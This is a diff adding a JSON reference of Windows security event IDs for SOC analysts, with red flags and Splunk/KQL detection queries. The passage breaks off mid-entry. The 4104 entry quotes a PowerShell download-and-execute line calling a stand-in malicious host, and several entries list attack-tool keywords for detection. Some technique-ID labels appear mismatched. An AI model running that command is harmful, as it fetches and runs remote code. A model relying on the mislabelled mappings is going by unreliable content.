@@ -1,0 +1,2492 @@
+{
+  "eventIds": [
+    {
+      "id": "4624",
+      "name": "Successful Logon",
+      "category": "Authentication",
+      "subcategory": "Logon Events",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "An account successfully logged on to a computer.",
+      "detailedDescription": "Event 4624 logs every successful logon to a system. Critical for detecting brute force success, credential misuse, and unauthorized access. Monitor Logon Type 10 (RDP) carefully.",
+      "logonTypes": {
+        "2": "Interactive (Local Logon)",
+        "3": "Network (SMB/RPC)",
+        "10": "RemoteInteractive (RDP)",
+        "5": "Service"
+      },
+      "keyFields": [
+        "TargetUserName - Account that logged on",
+        "SourceIPAddress - Source IP if remote",
+        "LogonType - Type of logon",
+        "AuthenticationPackage - NTLM or Kerberos"
+      ],
+      "mitre": [
+        "T1078.002",
+        "T1550.002"
+      ],
+      "mitreNames": [
+        "Valid Accounts - Domain Accounts",
+        "Use Stolen Credentials"
+      ],
+      "detectionStrategy": "Monitor RDP logons (Type 10) from unusual IPs. Correlate with failed attempts (4625). Watch for service accounts doing interactive logons.",
+      "falsePositives": [
+        "Legitimate user remote logons",
+        "Automated service accounts",
+        "Administrative access"
+      ],
+      "redFlags": [
+        "Multiple 4625 followed by 4624 (brute force success)",
+        "Logon Type 10 at unusual hours",
+        "Service account with interactive logon",
+        "Logon from never-before-seen IP"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4624 LogonType=10 | stats count by SourceIPAddress, TargetUserName | where count > 5",
+        "kql": "SecurityEvent | where EventID == 4624 and LogonType == 10 | summarize count() by SourceIPAddress, Account | where count_ > 5"
+      },
+      "example": "User successfully logs in via RDP from IP 192.168.1.50",
+      "relatedEvents": [
+        4625,
+        4648,
+        4672,
+        4778
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4625",
+      "name": "Failed Logon",
+      "category": "Authentication",
+      "subcategory": "Logon Events",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "An account failed to log on to a computer.",
+      "detailedDescription": "Event 4625 is generated every time a logon attempt fails. Multiple 4625 events can indicate brute force attack, password spraying, or credential misuse. This is ONE OF THE MOST IMPORTANT events for SOC analysts.",
+      "logonTypes": {
+        "2": "Interactive (Local Logon)",
+        "3": "Network (SMB/RPC)",
+        "10": "RemoteInteractive (RDP)",
+        "5": "Service"
+      },
+      "keyFields": [
+        "TargetUserName - Account attempted",
+        "SourceIPAddress - Attack source",
+        "FailureReason - Why it failed",
+        "SubStatus - Specific failure code"
+      ],
+      "mitre": [
+        "T1110.001",
+        "T1110.003",
+        "T1133"
+      ],
+      "mitreNames": [
+        "Brute Force - Password Guessing",
+        "Brute Force - Password Spraying",
+        "External Remote Services"
+      ],
+      "detectionStrategy": "Alert on >5 failed logons in 5 minutes from same IP. Watch for failed attempts to high-value accounts (admin, service accounts). Correlate with 4624 success.",
+      "falsePositives": [
+        "Users entering wrong password",
+        "Application with expired credentials",
+        "VPN disconnections",
+        "Legitimate failed logon attempts"
+      ],
+      "redFlags": [
+        "5+ failed logons in short timeframe from same IP",
+        "Failed logons to multiple accounts from same IP",
+        "Failed logons to admin/service accounts",
+        "Failed logon followed by successful 4624"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4625 | stats count as FailedCount by SourceIPAddress, TargetUserName | where FailedCount > 10 | sort - FailedCount",
+        "kql": "SecurityEvent | where EventID == 4625 | summarize FailCount = count() by SourceIPAddress, Account | where FailCount > 10"
+      },
+      "example": "Multiple failed RDP attempts from IP 203.0.113.50 to admin account",
+      "relatedEvents": [
+        4624,
+        4648,
+        4771
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4688",
+      "name": "Process Creation",
+      "category": "Execution",
+      "subcategory": "Process Events",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "A new process has been created.",
+      "detailedDescription": "Event 4688 is generated when a new process is created. CRITICAL for detecting malware execution, unauthorized scripts, and suspicious activity. Must enable 'Audit Process Creation' in GPO.",
+      "logonTypes": null,
+      "keyFields": [
+        "NewProcessName - Full path of new process",
+        "ParentProcessName - Process that created it",
+        "CommandLine - Full command with arguments",
+        "SubjectUserName - User who created process"
+      ],
+      "mitre": [
+        "T1059",
+        "T1086",
+        "T1053"
+      ],
+      "mitreNames": [
+        "Command and Scripting Interpreter",
+        "PowerShell",
+        "Scheduled Task"
+      ],
+      "detectionStrategy": "Alert on suspicious parent-child relationships (WINWORD.EXE → powershell.exe). Monitor cmd.exe and powershell.exe from unexpected parents. Block encoded PowerShell.",
+      "falsePositives": [
+        "Legitimate software installation",
+        "Windows updates",
+        "Antivirus scans",
+        "Scheduled tasks"
+      ],
+      "redFlags": [
+        "WINWORD.EXE or EXCEL.EXE spawning cmd.exe or powershell.exe",
+        "Encoded PowerShell (Base64 in command line)",
+        "System process (svchost.exe) creating unusual child processes",
+        "Process creation from TEMP or AppData folder"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4688 ParentProcessName=\"C:\\\\Program Files\\\\Microsoft Office\\\\*WINWORD.EXE\" (NewProcessName=\"*cmd.exe\" OR NewProcessName=\"*powershell.exe\")",
+        "kql": "SecurityEvent | where EventID == 4688 and ParentProcessName contains \"WINWORD\" and (NewProcessName contains \"cmd.exe\" or NewProcessName contains \"powershell.exe\")"
+      },
+      "example": "WINWORD.EXE (spawned by user opening malicious Word document) creates powershell.exe with Base64-encoded command",
+      "relatedEvents": [
+        4689,
+        4703,
+        1102
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4689",
+      "name": "Process Terminated",
+      "category": "Execution",
+      "subcategory": "Process Events",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A process has exited.",
+      "detailedDescription": "Event 4689 is generated when a process terminates. Useful for timeline analysis and detecting process termination anomalies. Less critical than 4688 but valuable for correlation.",
+      "logonTypes": null,
+      "keyFields": [
+        "ProcessName - Process that terminated",
+        "ProcessId - PID of process",
+        "ExitStatus - Exit code"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Correlate with 4688 to build process timelines. Watch for processes terminated by unusual users. Useful for forensics.",
+      "falsePositives": [
+        "Normal process termination",
+        "Application crashes",
+        "System shutdown"
+      ],
+      "redFlags": [
+        "Malware process terminating unexpectedly",
+        "Process terminated by unusual user"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4689 | stats count by ProcessName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4689 | summarize count() by ProcessName"
+      },
+      "example": "powershell.exe process terminates after 2 minutes of execution",
+      "relatedEvents": [
+        4688
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4104",
+      "name": "PowerShell Script Block Logging",
+      "category": "Execution",
+      "subcategory": "PowerShell Logs",
+      "severity": "CRITICAL",
+      "color": "#DC143C",
+      "description": "PowerShell Script Block logging captured execution of script content.",
+      "detailedDescription": "Event 4104 logs PowerShell script content REGARDLESS of obfuscation. This is CRITICAL for detecting encoded malware, Empire payloads, and malicious scripts. Found in Event Viewer under Windows PowerShell. Must enable via GPO: 'Turn on Module Logging' and 'Turn on Script Block Logging'.",
+      "logonTypes": null,
+      "keyFields": [
+        "ScriptBlockText - Actual PowerShell code executed",
+        "ScriptBlockId - Unique ID",
+        "Path - Script location if from file"
+      ],
+      "mitre": [
+        "T1059.001",
+        "T1036.001"
+      ],
+      "mitreNames": [
+        "PowerShell",
+        "Obfuscated Files or Information"
+      ],
+      "detectionStrategy": "Search for suspicious keywords: 'IEX', 'DownloadString', 'Base64', 'Invoke-', 'mimikatz', 'GetProcAddress'. Alert on encoded payloads. Monitor for Empire, Cobalt Strike signatures.",
+      "falsePositives": [
+        "Legitimate admin scripts",
+        "Windows updates using PowerShell",
+        "System management tools"
+      ],
+      "redFlags": [
+        "Base64-encoded PowerShell",
+        "IEX (Invoke-Expression) + DownloadString",
+        "References to mimikatz or PSTools",
+        "Credentials in clear text in script"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4104 ScriptBlockText IN (\"*IEX*\", \"*DownloadString*\", \"*Base64*\", \"*mimikatz*\")",
+        "kql": "Event | where EventID == 4104 and ScriptBlockText contains \"IEX\" or ScriptBlockText contains \"DownloadString\" or ScriptBlockText contains \"mimikatz\""
+      },
+      "example": "PowerShell executes: IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
+      "relatedEvents": [
+        4103,
+        800,
+        4688
+      ],
+      "difficulty": "Advanced"
+    },
+    {
+      "id": "4103",
+      "name": "PowerShell Module Logging",
+      "category": "Execution",
+      "subcategory": "PowerShell Logs",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "PowerShell module and script information is being logged.",
+      "detailedDescription": "Event 4103 logs when PowerShell modules are loaded. Useful for detecting when malicious modules like ActiveDirectory, PSTools, or reconnaissance modules are loaded.",
+      "logonTypes": null,
+      "keyFields": [
+        "ModuleName - Name of loaded module",
+        "ModuleVersion - Version info",
+        "ScriptName - Script using the module"
+      ],
+      "mitre": [
+        "T1059.001"
+      ],
+      "mitreNames": [
+        "PowerShell"
+      ],
+      "detectionStrategy": "Alert on suspicious module loading: mimikatz, PSTools, ActiveDirectory queries, SenseLogix. Look for modules loaded from unusual paths.",
+      "falsePositives": [
+        "Legitimate administrative scripts",
+        "Windows updates",
+        "System tools"
+      ],
+      "redFlags": [
+        "mimikatz module loaded",
+        "PSTools modules (PSScan, PSExec)",
+        "ActiveDirectory module from unexpected user",
+        "Module loaded from TEMP folder"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4103 ModuleName IN (\"*mimikatz*\", \"*PSTools*\", \"*ActiveDirectory*\")",
+        "kql": "Event | where EventID == 4103 and ModuleName contains \"mimikatz\""
+      },
+      "example": "PowerShell loads ActiveDirectory module for credential enumeration",
+      "relatedEvents": [
+        4104,
+        800
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4648",
+      "name": "Logon with Explicit Credentials",
+      "category": "Authentication",
+      "subcategory": "Logon Events",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "A logon was attempted using explicit credentials.",
+      "detailedDescription": "Event 4648 is generated when someone uses explicit credentials (RunAs, script, scheduled task). CRITICAL for detecting credential misuse and lateral movement via credential delegation.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - User who ran the command",
+        "TargetUserName - Account being impersonated",
+        "TargetServerName - Target computer",
+        "ProcessName - Process requesting credentials"
+      ],
+      "mitre": [
+        "T1550.002",
+        "T1550.004"
+      ],
+      "mitreNames": [
+        "Use Stolen Credentials",
+        "Token Impersonation"
+      ],
+      "detectionStrategy": "Alert on RunAs usage from unusual users. Monitor scheduled tasks with explicit credentials. Watch for service accounts using explicit credentials.",
+      "falsePositives": [
+        "Legitimate RunAs usage",
+        "Scheduled tasks with explicit creds (common)",
+        "Administrative delegation"
+      ],
+      "redFlags": [
+        "Service account running as admin",
+        "PowerShell RunAs to sensitive account",
+        "Explicit credentials to server not normally accessed",
+        "RunAs from user not in IT department"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4648 TargetUserName=\"*admin*\" | stats count by SubjectUserName, ProcessName",
+        "kql": "SecurityEvent | where EventID == 4648 and TargetUserName contains \"admin\" | summarize count() by SubjectUserName"
+      },
+      "example": "User runs: runas /user:DOMAIN\\Administrator powershell.exe",
+      "relatedEvents": [
+        4624,
+        4672,
+        4673
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4672",
+      "name": "Special Privileges Assigned to New Logon",
+      "category": "Privilege Escalation",
+      "subcategory": "Privileges",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "Special privileges were assigned to a new logon.",
+      "detailedDescription": "Event 4672 is generated when an account with special privileges (admin, backup operators, etc.) logs in. CRITICAL for detecting privilege escalation and admin account misuse.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Account that logged in",
+        "PrivilegeList - Privileges assigned (SE_BACKUP_NAME, SE_DEBUG_NAME, etc.)",
+        "SourceIPAddress - Where login originated"
+      ],
+      "mitre": [
+        "T1134.002",
+        "T1134.003"
+      ],
+      "mitreNames": [
+        "Create Process with Token",
+        "Make and Impersonate Token"
+      ],
+      "detectionStrategy": "Alert on admin/service account logons especially from unusual IPs. Monitor PrivilegeList for dangerous privileges like SE_DEBUG, SE_BACKUP. Correlate with 4624.",
+      "falsePositives": [
+        "Legitimate admin logons",
+        "Service account logons",
+        "IT staff access"
+      ],
+      "redFlags": [
+        "Admin account logon at night/weekend",
+        "Admin account logon from unusual IP",
+        "Service account elevated privileges",
+        "Multiple admin logons in short time"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4672 SubjectUserName=\"*admin*\" SourceIPAddress!=\"192.168.*\" | stats count by SubjectUserName, SourceIPAddress",
+        "kql": "SecurityEvent | where EventID == 4672 and Account contains \"admin\" and SourceIPAddress !startswith \"192.168\" | summarize count() by Account"
+      },
+      "example": "DOMAIN\\Administrator logs in from external IP with full privileges",
+      "relatedEvents": [
+        4624,
+        4673,
+        4674
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4673",
+      "name": "Privileged Service Called",
+      "category": "Privilege Escalation",
+      "subcategory": "Privileges",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "A privileged service was called.",
+      "detailedDescription": "Event 4673 is generated when a privileged service is invoked. Useful for detecting token impersonation and privilege escalation attempts via Windows APIs.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - User calling the service",
+        "Service - Name of privileged service",
+        "ProcessName - Process making the call"
+      ],
+      "mitre": [
+        "T1134.002"
+      ],
+      "mitreNames": [
+        "Create Process with Token"
+      ],
+      "detectionStrategy": "Monitor for unusual processes calling privileged services. Alert on non-admin processes accessing sensitive services.",
+      "falsePositives": [
+        "Windows legitimate operations",
+        "Administrative tools",
+        "Security software"
+      ],
+      "redFlags": [
+        "Non-admin process calling sensitive service",
+        "Multiple privilege escalation attempts from same user"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4673 | stats count by SubjectUserName, Service, ProcessName",
+        "kql": "SecurityEvent | where EventID == 4673 | summarize count() by SubjectUserName"
+      },
+      "example": "PowerShell attempts to call a privileged service for token manipulation",
+      "relatedEvents": [
+        4672,
+        4674
+      ],
+      "difficulty": "Advanced"
+    },
+    {
+      "id": "4674",
+      "name": "An Operation on a Privileged Object was Attempted",
+      "category": "Privilege Escalation",
+      "subcategory": "Privileges",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "An attempt was made to operate on a privileged object.",
+      "detailedDescription": "Event 4674 indicates an attempt to access or modify sensitive system objects. Useful for detecting unauthorized access to sensitive resources.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - User attempting operation",
+        "ObjectName - Object being accessed",
+        "ObjectType - Type of object"
+      ],
+      "mitre": [
+        "T1134"
+      ],
+      "mitreNames": [
+        "Access Token Manipulation"
+      ],
+      "detectionStrategy": "Monitor for non-admin users attempting to access privileged objects. Alert on repeated failures.",
+      "falsePositives": [
+        "Legitimate administrative access",
+        "Windows updates",
+        "System maintenance"
+      ],
+      "redFlags": [
+        "Non-admin user accessing privileged object",
+        "Multiple failed attempts from same user"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4674 | stats count by SubjectUserName, ObjectName",
+        "kql": "SecurityEvent | where EventID == 4674 | summarize count() by SubjectUserName"
+      },
+      "example": "Non-admin user attempts to modify sensitive registry key",
+      "relatedEvents": [
+        4672,
+        4673
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4720",
+      "name": "User Account Created",
+      "category": "Account Management",
+      "subcategory": "User Accounts",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A user account was created.",
+      "detailedDescription": "Event 4720 is generated when a new user account is created. Important for detecting unauthorized account creation and backdoor accounts.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - New account name",
+        "SubjectUserName - Who created it",
+        "SamAccountName - SAM name",
+        "UserPrincipalName - UPN"
+      ],
+      "mitre": [
+        "T1136.001"
+      ],
+      "mitreNames": [
+        "Create Account - Local Account"
+      ],
+      "detectionStrategy": "Alert on user account creation outside normal hours. Monitor for accounts created with suspicious names. Verify creation with IT team.",
+      "falsePositives": [
+        "Legitimate new employees",
+        "IT onboarding process",
+        "Automated provisioning"
+      ],
+      "redFlags": [
+        "Account created at night/weekend",
+        "Suspicious account name (admin, test, temp)",
+        "Account created by non-admin user",
+        "Multiple accounts created rapidly"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4720 | stats count by TargetUserName, SubjectUserName | sort - count",
+        "kql": "SecurityEvent | where EventID == 4720 | summarize count() by TargetUserName"
+      },
+      "example": "User 'attacker' creates account 'backdoor_admin' during off-hours",
+      "relatedEvents": [
+        4722,
+        4724,
+        4726
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4722",
+      "name": "User Account Enabled",
+      "category": "Account Management",
+      "subcategory": "User Accounts",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A user account was enabled.",
+      "detailedDescription": "Event 4722 is generated when a disabled account is re-enabled. Useful for detecting when dormant accounts are activated.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Account enabled",
+        "SubjectUserName - Who enabled it"
+      ],
+      "mitre": [
+        "T1098.002"
+      ],
+      "mitreNames": [
+        "Account Manipulation"
+      ],
+      "detectionStrategy": "Monitor for disabled accounts being re-enabled. Alert on service accounts being enabled.",
+      "falsePositives": [
+        "Legitimate account reactivation",
+        "Returning employees",
+        "IT maintenance"
+      ],
+      "redFlags": [
+        "Dormant account suddenly enabled",
+        "Service account enabled unexpectedly",
+        "Account enabled by unusual user"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4722 | stats count by TargetUserName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4722 | summarize count() by TargetUserName"
+      },
+      "example": "Attacker re-enables disabled backdoor account",
+      "relatedEvents": [
+        4720,
+        4724,
+        4725
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4723",
+      "name": "An Attempt was Made to Change an Account's Password",
+      "category": "Account Management",
+      "subcategory": "User Accounts",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "An attempt was made to change an account's password.",
+      "detailedDescription": "Event 4723 is generated when password change is attempted. Important for detecting credential compromise and account hijacking.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Account whose password change was attempted",
+        "SubjectUserName - Who attempted the change"
+      ],
+      "mitre": [
+        "T1098"
+      ],
+      "mitreNames": [
+        "Account Manipulation"
+      ],
+      "detectionStrategy": "Alert on failed password changes. Monitor for password changes on admin/service accounts. Correlate with 4725 (failed attempts).",
+      "falsePositives": [
+        "User changing own password",
+        "Password reset by help desk",
+        "Scheduled password changes"
+      ],
+      "redFlags": [
+        "Password change for account user doesn't know",
+        "Multiple failed password change attempts",
+        "Admin account password changed by non-admin",
+        "Password change followed by logon with new password"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4723 | stats count by TargetUserName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4723 | summarize count() by TargetUserName"
+      },
+      "example": "Attacker changes compromised admin account password",
+      "relatedEvents": [
+        4724,
+        4725
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4724",
+      "name": "An Attempt was Made to Reset an Account's Password",
+      "category": "Account Management",
+      "subcategory": "User Accounts",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "An attempt was made to reset an account's password.",
+      "detailedDescription": "Event 4724 is generated when password reset is attempted. Important for detecting account takeover and unauthorized credential changes.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Account whose password reset was attempted",
+        "SubjectUserName - Who attempted the reset"
+      ],
+      "mitre": [
+        "T1098"
+      ],
+      "mitreNames": [
+        "Account Manipulation"
+      ],
+      "detectionStrategy": "Alert on password resets by unauthorized users. Monitor resets on critical accounts. Correlate with logon attempts.",
+      "falsePositives": [
+        "Help desk password resets",
+        "User self-service password reset",
+        "Admin resetting forgotten passwords"
+      ],
+      "redFlags": [
+        "Password reset by user outside IT department",
+        "Admin account password reset",
+        "Multiple password resets on same account",
+        "Password reset followed by logon from unusual IP"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4724 TargetUserName=\"*admin*\" | stats count by SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4724 and TargetUserName contains \"admin\" | summarize count() by SubjectUserName"
+      },
+      "example": "Attacker resets admin account password to gain access",
+      "relatedEvents": [
+        4723,
+        4725,
+        4624
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4728",
+      "name": "Member Added to Security-Enabled Global Group",
+      "category": "Account Management",
+      "subcategory": "Group Membership",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A member was added to a security-enabled global group.",
+      "detailedDescription": "Event 4728 is generated when a user is added to a global security group. Critical for detecting privilege escalation via group membership.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Group name",
+        "MemberName - User added to group",
+        "SubjectUserName - Who added the user"
+      ],
+      "mitre": [
+        "T1098.001"
+      ],
+      "mitreNames": [
+        "Account Manipulation - Additional Cloud Roles"
+      ],
+      "detectionStrategy": "Alert on users being added to sensitive groups (Domain Admins, Schema Admins, Enterprise Admins). Verify with IT.",
+      "falsePositives": [
+        "Legitimate group membership additions",
+        "New employee onboarding",
+        "Permission changes"
+      ],
+      "redFlags": [
+        "User added to Domain Admins group",
+        "Non-IT user added to privileged group",
+        "Service account added to admin group",
+        "Addition by unauthorized user"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4728 TargetUserName IN (\"Domain Admins\", \"Schema Admins\", \"Enterprise Admins\") | stats count by MemberName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4728 and TargetUserName contains \"admin\" | summarize count() by MemberName"
+      },
+      "example": "Attacker adds compromised user to Domain Admins group",
+      "relatedEvents": [
+        4729,
+        4732,
+        4733
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4729",
+      "name": "Member Removed from Security-Enabled Global Group",
+      "category": "Account Management",
+      "subcategory": "Group Membership",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A member was removed from a security-enabled global group.",
+      "detailedDescription": "Event 4729 is generated when a user is removed from a global group. Less critical than 4728 but useful for timeline analysis.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Group name",
+        "MemberName - User removed from group",
+        "SubjectUserName - Who removed the user"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor for removal of users from critical groups. Useful for forensics and timeline building.",
+      "falsePositives": [
+        "Legitimate group membership removal",
+        "Employee offboarding",
+        "Permission changes"
+      ],
+      "redFlags": [
+        "User removed from critical group unexpectedly",
+        "Removal by non-admin user"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4729 | stats count by TargetUserName, MemberName",
+        "kql": "SecurityEvent | where EventID == 4729 | summarize count() by TargetUserName"
+      },
+      "example": "Admin removes user from group after security incident",
+      "relatedEvents": [
+        4728,
+        4732,
+        4733
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4731",
+      "name": "Security-Enabled Local Group Created",
+      "category": "Account Management",
+      "subcategory": "Group Management",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A security-enabled local group was created.",
+      "detailedDescription": "Event 4731 is generated when a local group is created. Important for detecting unauthorized group creation and backdoors.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Name of new group",
+        "SubjectUserName - Who created it",
+        "SamAccountName - SAM name"
+      ],
+      "mitre": [
+        "T1136.001"
+      ],
+      "mitreNames": [
+        "Create Account - Local Account"
+      ],
+      "detectionStrategy": "Alert on new group creation outside normal hours. Verify group purpose with IT. Monitor group names for suspicious patterns.",
+      "falsePositives": [
+        "Legitimate group creation",
+        "Permission management",
+        "Application setup"
+      ],
+      "redFlags": [
+        "Group created at night/weekend",
+        "Suspicious group name",
+        "Group created by non-admin user",
+        "Group created and populated immediately"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4731 | stats count by TargetUserName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4731 | summarize count() by TargetUserName"
+      },
+      "example": "Attacker creates local group 'AdminBackdoor' with admin privileges",
+      "relatedEvents": [
+        4732,
+        4733,
+        4734
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4732",
+      "name": "Member Added to Security-Enabled Local Group",
+      "category": "Account Management",
+      "subcategory": "Group Membership",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A member was added to a security-enabled local group.",
+      "detailedDescription": "Event 4732 is generated when user is added to local group. Important for detecting privilege escalation.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Local group name",
+        "MemberName - User added",
+        "SubjectUserName - Who added them"
+      ],
+      "mitre": [
+        "T1098.001"
+      ],
+      "mitreNames": [
+        "Account Manipulation"
+      ],
+      "detectionStrategy": "Alert on users added to sensitive local groups (Administrators, Remote Desktop Users). Verify additions.",
+      "falsePositives": [
+        "Legitimate group additions",
+        "Permission grants",
+        "Application setup"
+      ],
+      "redFlags": [
+        "User added to Administrators group",
+        "Service account added to privileged group",
+        "Addition by non-admin",
+        "Multiple additions in short time"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4732 TargetUserName=\"Administrators\" | stats count by MemberName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4732 and TargetUserName == \"Administrators\" | summarize count() by MemberName"
+      },
+      "example": "Attacker adds compromised user to local Administrators group",
+      "relatedEvents": [
+        4731,
+        4733,
+        4728
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4733",
+      "name": "Member Removed from Security-Enabled Local Group",
+      "category": "Account Management",
+      "subcategory": "Group Membership",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A member was removed from a security-enabled local group.",
+      "detailedDescription": "Event 4733 is generated when user is removed from local group. Less critical but useful for forensics.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Local group name",
+        "MemberName - User removed",
+        "SubjectUserName - Who removed them"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor for removal of users from critical groups. Useful for timeline analysis.",
+      "falsePositives": [
+        "Legitimate removal",
+        "Permission changes",
+        "Offboarding"
+      ],
+      "redFlags": [
+        "Unexpected removal from critical group",
+        "Removal by non-admin"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4733 | stats count by TargetUserName, MemberName",
+        "kql": "SecurityEvent | where EventID == 4733 | summarize count() by TargetUserName"
+      },
+      "example": "Admin removes user from Administrators group after incident",
+      "relatedEvents": [
+        4732,
+        4729,
+        4728
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4741",
+      "name": "Computer Account Created",
+      "category": "Account Management",
+      "subcategory": "Computer Accounts",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A computer account was created.",
+      "detailedDescription": "Event 4741 is generated when computer account is created in AD. Important for detecting rogue systems added to network.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetComputerName - New computer name",
+        "SubjectUserName - Who created it",
+        "AllowedToDelegate - Trust for delegation"
+      ],
+      "mitre": [
+        "T1136.001"
+      ],
+      "mitreNames": [
+        "Create Account - Local Account"
+      ],
+      "detectionStrategy": "Alert on computer account creation. Verify with IT. Check if account has delegation rights (dangerous).",
+      "falsePositives": [
+        "New workstations added",
+        "VM provisioning",
+        "Server setup"
+      ],
+      "redFlags": [
+        "Computer added at night/weekend",
+        "Suspicious computer name",
+        "Account created by non-admin",
+        "Account with delegation rights"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4741 | stats count by TargetComputerName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4741 | summarize count() by TargetComputerName"
+      },
+      "example": "Attacker adds rogue computer 'DOMAIN-ADMIN-PC$' to network",
+      "relatedEvents": [
+        4743,
+        4742
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4743",
+      "name": "Computer Account Deleted",
+      "category": "Account Management",
+      "subcategory": "Computer Accounts",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A computer account was deleted.",
+      "detailedDescription": "Event 4743 is generated when computer account is deleted. Less critical but useful for forensics.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetComputerName - Deleted computer",
+        "SubjectUserName - Who deleted it"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor for computer account deletion. Correlate with decommissioning records.",
+      "falsePositives": [
+        "Legitimate decommissioning",
+        "VM cleanup",
+        "System removal"
+      ],
+      "redFlags": [
+        "Computer deleted unexpectedly",
+        "Deletion by non-admin",
+        "Critical system deleted"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4743 | stats count by TargetComputerName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4743 | summarize count() by TargetComputerName"
+      },
+      "example": "System cleanup removes old workstation account",
+      "relatedEvents": [
+        4741,
+        4742
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4738",
+      "name": "User Account Changed",
+      "category": "Account Management",
+      "subcategory": "User Accounts",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A user account was changed.",
+      "detailedDescription": "Event 4738 is generated when account attributes are modified (name, home directory, profile, etc.). Useful for tracking account modifications.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Modified account",
+        "SubjectUserName - Who modified it",
+        "ChangedAttributes - What was changed"
+      ],
+      "mitre": [
+        "T1098"
+      ],
+      "mitreNames": [
+        "Account Manipulation"
+      ],
